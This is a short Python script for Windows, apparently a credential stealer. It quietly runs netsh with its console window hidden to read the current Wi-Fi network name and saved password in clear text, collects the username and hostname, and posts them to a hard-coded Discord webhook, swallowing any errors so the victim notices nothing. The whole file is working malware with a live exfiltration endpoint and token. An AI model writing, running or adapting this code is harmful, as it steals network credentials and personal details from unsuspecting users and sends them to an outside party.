import subprocess
import requests
import socket
import getpass
from datetime import datetime

# Your webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1459378040332222702/fVl25Ogayf2gW9wAR3wuGRKwvI_o8lJm-WmqZdwgawIGxLeqUtE7Hbytp-hGhCVpCDQO"


def get_current_wifi_info():
    if socket.gethostname().lower() == "unknown":
        return None, None

    try:
        # Hide console window
        info = subprocess.run(
            ['netsh', 'wlan', 'show', 'interfaces'],
            capture_output=True,
            text=True,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        ).stdout

        ssid = None
        for line in info.splitlines():
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
                break

        if not ssid or ssid == "":
            return None, None

        # Get password (only works if connected right now)
        pw_info = subprocess.run(
            ['netsh', 'wlan', 'show', 'profile', f'name="{ssid}"', 'key=clear'],
            capture_output=True,
            text=True,
            creationflags=0x08000000
        ).stdout

        password = "Not found / not saved"
        for line in pw_info.splitlines():
            if "Key Content" in line:
                password = line.split(":", 1)[1].strip()
                break

        return ssid, password

    except Exception:
        return None, None


def build_message():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = getpass.getuser()
    host = socket.gethostname()

    ssid, password = get_current_wifi_info()

    if ssid is None:
        content = (
            "**Wi-Fi Info** (failed to retrieve)\n"
            f"• {now}\n"
            f"• {user} @ {host}\n\n"
            "Could not get current Wi-Fi information"
        )
    else:
        content = (
            "**Current Wi-Fi Information**\n"
            f"• User: {user}\n\n"
            f"**Network:** {ssid}\n"
            f"**Password:** `{password}`"
        )

    return content


def send_silent():
    try:
        message = build_message()
        requests.post(
            WEBHOOK_URL,
            json={"content": message},
            timeout=7
        )
    except:
        pass  # silent fail


if __name__ == "__main__":
    send_silent()
